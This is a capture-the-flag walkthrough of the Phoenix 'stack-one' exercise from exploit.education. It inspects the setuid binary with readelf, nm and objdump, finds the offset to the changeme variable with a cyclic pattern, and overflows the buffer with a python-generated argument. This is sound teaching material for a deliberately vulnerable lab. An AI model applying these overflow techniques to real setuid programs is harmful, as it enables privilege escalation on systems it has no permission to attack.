# Stack One
Stack one is the second challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-one`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at the output of the following output :
```bash
$ file stack-one                                   
stack-one: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped`
```
#### ELF Header
The ELF Header contains important informations about a file, it's always a good idea to check it and we're going to do this now using readelf :

```
$ readelf -h stack-one
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400500
  Start of program headers:          64 (bytes into file)
  Start of section headers:          4704 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         7
  Size of section headers:           64 (bytes)
  Number of section headers:         23
  Section header string table index: 20
```

## Finding function calls in the binary
#### Let's take a look at the Symbol Tables
You can read a bit more about the ELF Specification if you don't know what it is or how it works at the following links :
https://docs.oracle.com/cd/E19455-01/806-3773/elf-6/index.html
https://greek0.net/elf.html
http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-vi.html

Alright so, we take a look at the `dynamic table (.dynsym)` first because it contains informations about some function calls used by the binary.

```
Symbol table '.dynsym' contains 12 entries:   
  Num:    Value          Size Type    Bind   Vis      Ndx Name 
  0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
  1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy               
  2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf
  3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts     
  4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND errx         
  5: 0000000000400478     1 FUNC    GLOBAL DEFAULT    6 _init           
  6: 0000000000600a98     0 NOTYPE  GLOBAL DEFAULT   18 __bss_start     
  7: 0000000000400742     1 FUNC    GLOBAL DEFAULT    9 _fini                
  8: 0000000000600a98     0 NOTYPE  GLOBAL DEFAULT   17 _edata                 
  9: 0000000000600af0     0 NOTYPE  GLOBAL DEFAULT   18 _end
 10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit
 11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main
```

We can see that it shows a couple of functions that might by interesting to us, to find the functions just look at the `Type` of the Symbol and
if it is a FUNC it should be a function call, we can already see a couple of functions the program might be using.
- strcpy
- printf
- puts
- exit
- errx

Functions are always important to know when reversing an executable hence it is always a good move to look at Symbolic Tables

#### Dump function Symbols
Now we had a small look at the dynamic table, we are going to dump most function calls imported by the program along with their addresses.
For this we'll use `objdump` and `nm`.

**Let's start with `nm` :**
As per the man page says we can see the following output format :
Symbol Value | Symbol Type | Symbol Name

```
0000000000600a98 B __bss_start                                                                                                                              0000000000600aa0 b completed.5577                                             
00000000006008f0 d __CTOR_END__                               
00000000006008e8 d __CTOR_LIST__                                                                                             
0000000000400540 t deregister_tm_clones 
0000000000400700 t __do_global_ctors_aux                      
00000000004005b0 t __do_global_dtors_aux                      
0000000000600a90 D __dso_handle                               
0000000000600900 D __DTOR_END__                               
0000000000600aa8 b dtor_idx.5579                              
00000000006008f8 d __DTOR_LIST__                              
0000000000600908 d _DYNAMIC                                   
0000000000600a98 D _edata                                     
00000000004008c0 r __EH_FRAME_BEGIN__                         
0000000000600af0 B _end                                       
                 U errx                                       
                 U exit                                       
0000000000400742 T _fini                                                                                                     
0000000000400640 t frame_dummy                                       
00000000004008e0 r __FRAME_END__                              
0000000000600a48 d _GLOBAL_OFFSET_TABLE_                      
0000000000400864 r __GNU_EH_FRAME_HDR                         
0000000000400478 T _init                                      
                 U __libc_start_main                          
000000000040066d T main                                       
0000000000600ac0 b object.5589                                
                 U printf                                                                                                    
                 U puts           
0000000000400570 t register_tm_clones                         
0000000000400500 T _start                                                                                                    
0000000000400516 T _start_c                                                                                                                
                 U strcpy              
0000000000600a98 D __TMC_END__
```
We can see a little more output than we previously did on the .dynsym section, always check with `nm` for function calls in a binary instead of using the .dynsym section.

**We can also do with `objdump` like we said we'll do :**
You can always check with objdump for function calls, it'll show less output but it still a good thing to do :
```
0000000000000000      DF *UND*  0000000000000000 strcpy
0000000000000000      DF *UND*  0000000000000000 printf
0000000000000000      DF *UND*  0000000000000000 puts
0000000000000000      DF *UND*  0000000000000000 errx
0000000000400478 g    DF .init  0000000000000001 _init
0000000000600a98 g    D  .bss   0000000000000000 __bss_start
0000000000400742 g    DF .fini  0000000000000001 _fini
0000000000600a98 g    D  .data  0000000000000000 _edata
0000000000600af0 g    D  .bss   0000000000000000 _end
0000000000000000      DF *UND*  0000000000000000 exit
0000000000000000      DF *UND*  0000000000000000 __libc_start_main
```
Pretty much the same output but with less information, so you should consider sticking to `nm` for this kind of stuff, but checking with objdump is not a bad practice either.

## First program run
Let's run the program :
```
$ ./stack-one                                      
Welcome to phoenix/stack-one, brought to you by https://exploit.education
stack-one: specify an argument, to be copied into the "buffer"
```

As the output is showing "specify an argument, to be copier into the 'buffer' "
So we'll run the program giving it an argument :
```
$ ./stack-one test                                                                                                                                   
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962
```
It says we want 0x496c5962 and changeme is currently 0x00000000 on the stack, so we need to overwrite 0x00000000 by 0x496c5962.

## Obtaining Flag
We need to determine the offset of 0x00000000 on the stack so we'll generate a cyclic pattern and verify the offset of 0x00000000 on the stack this way.
For this the `pwntools` python module contain a utility called cyclic that allow us to generate cyclic patterns, but we can also use `pattern_offset` and `pattern_locate` from `metasploit`.
```
$ cyclic 200                                                              
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Let's run our program using the cyclic pattern output from cyclic
```
$ ./stack-one $(cyclic 200)                        
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x61616171, we want 0x496c5962
```
We can see the value of previously 0x00000000 now 0x61616171, we now can determine the offset of 0x61616171 on the stack using cyclic once again

Now we need to find the offset of `changeme` on the stack
```
$ cyclic -l 0x61616171 
64
```
We see the offset is 64, so logically we can put 64 bytes before our 0x496c5962 (which is the value we want).

The value of 0x496c5962 is IlYb in ASCII notation, note that we're working on a LSB (Least-Significant Byte or Little Endian) so let's change the address to it's Little Endian notation : 0x62596c49 and transform it into it's ASCII notation -> bYlI
```
$ echo $'\x62\x59\x6c\x49' 
bYlI
```
So we can print 64 characters + IlYb and we should win :
```
$ ./stack-one $(python -c "print('A'*64 + 'bYlI')")                 
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
